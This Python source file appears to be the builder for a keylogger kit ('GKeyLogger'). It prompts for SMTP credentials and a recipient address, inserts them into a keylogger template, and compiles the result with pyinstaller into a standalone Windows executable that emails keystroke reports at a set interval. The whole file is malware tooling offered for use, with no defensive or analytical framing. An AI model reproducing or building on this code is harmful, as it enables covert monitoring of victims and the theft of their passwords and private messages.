import sys
import os

def getfcontent(file):
		filedata = ''
		with open(file) as f :
			filedata = f.read()
		return filedata

def writefcontent(file,filedata):
		with open(file,'w') as f :
			state = f.write(filedata)
		return state

def main(argv):
	W  = '\033[0m'  # white (normal)
	R  = '\033[31m' # red
	G  = '\033[32m' # green
	O  = '\033[33m' # orange
	B  = '\033[34m' # blue
	P  = '\033[35m' # purple
	print('\t{}Welcome to mail sender framework ......{}'.format(G,G))
	print('\t{}you can use this framework for creating GKeyLogger \nCoded By : Ghost5egy{}'.format(R,R))
	print('\t{}1- Email Notification . {}'.format(O,O))
	print('\t{}2- WebSocket Notification . {}'.format(O,O))    
	sendtype = -1
	while True:
		sendtype = int(input('\t{0}Enter Your choice : {1}'.format(B,B)))
		if sendtype > 2 or sendtype < 0 :
			print('{}\tYou Entered a wrong choice please insert a valid one .{}'.format(R,R))
		else:
			if sendtype == 1:
				print('{}\tyou choosed {} then you want use email Notification{}'.format(R,sendtype,R))
			else:
				print('{}\tyou choosed {} then you want Use Websocket Notification{}'.format(R,sendtype,R))
			break
	if sendtype == 1:
		#iconfile = input('\t{0}Enter Icon path (must be an .ico file) : {1}'.format(B,B))
		#if iconfile == "":
			#print("You Enter Nothing then no icon will be added to exe")
			#iconfile = "NONE"
		gserver = input('\t{0}Enter The Smtp Server : {1}'.format(B,B))
		gport = int(input('\t{0}Enter The Smtp port : {1}'.format(B,B)))
		guser = input('\t{0}Enter The Smtp User : {1}'.format(B,B))
		gpass = input('\t{0}Enter The Smtp password : {1}'.format(B,B))
		mailfrom = input('\t{0}Enter The sender email : {1}'.format(B,B))
		mailto = input('\t{0}Enter The reciver email : {1}'.format(B,B))
		subject = input('\t{0}Enter The Subjectit for report mail : {1}'.format(B,B))
		reportduration = input('\t{0}Enter The duraon that you revecive report email in minutes : {1}'.format(B,B))
		keyconn = "interval=" + reportduration + "\nrunobjects('" + gserver + "' , '" + str(gport) + "' , '" + guser + "' , '" + gpass + "' , '" + mailfrom + "' , '" + mailto + "' , '" + subject + "')"
		klgstr = getfcontent("templates/Gkeyloggertemplate.py")
		klgstr += keyconn
		writefcontent("Keylogger.py",klgstr)
		print(getfcontent("Keylogger.py"))
		if sys.platform != "win32":
			os.system("sudo wine pyinstaller --onefile --hidden-import='/root/.wine/drive_c/users/root/Local Settings/Application Data/Programs/Python/Python38-32/Lib/site-packages/pywin32_system32/pywintypes32.dll' Keylogger.py")
		else:
			os.system("pyinstaller --onefile --hidden-import='pywintypes32.dll' Keylogger.py")
		print("open dist folder and get your exe keylogger\nif you use Gmail allow less secure applications from this link https://myaccount.google.com/lesssecureapps ")
	else:
		print('Not implemented yet')

if __name__ == "__main__":
	main(sys.argv[1:])
